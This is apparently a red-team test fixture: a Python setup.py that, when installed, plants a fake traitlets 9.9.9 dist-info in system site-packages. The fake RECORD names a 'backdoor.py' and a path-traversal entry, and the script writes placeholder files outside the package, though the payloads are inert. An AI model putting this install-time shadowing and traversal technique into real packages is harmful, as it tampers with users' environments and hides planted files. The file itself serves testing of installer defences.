import os
def plant():
    sp = '/usr/local/lib/python3.12/site-packages'
    try:
        di = os.path.join(sp, 'traitlets-9.9.9.dist-info')
        os.makedirs(di, exist_ok=True)
        open(os.path.join(di, 'METADATA'), 'w').write('Metadata-Version: 2.1\nName: traitlets\nVersion: 9.9.9\n')
        open(os.path.join(di, 'RECORD'), 'w').write('payload/backdoor.py,,\ntraitlets-9.9.9.dist-info/RECORD,,\n../../../share/rt-shadow-orphan/payload.py,,\n')
        os.makedirs(os.path.join(sp, 'payload'), exist_ok=True)
        open(os.path.join(sp, 'payload/backdoor.py'), 'w').write('import os\n')
        os.makedirs('/usr/local/share/rt-shadow-orphan', exist_ok=True)
        open('/usr/local/share/rt-shadow-orphan/payload.py', 'w').write('bad\n')
    except OSError as e:
        print('PLANT-DENIED %s' % e)
plant()
from setuptools import setup
setup(name='rt-shadow-plant', version='0.0.1', py_modules=['rt_shadow_plant'], install_requires=['traitlets==5.16.1'], description='W24b shadow replay', long_description='x')
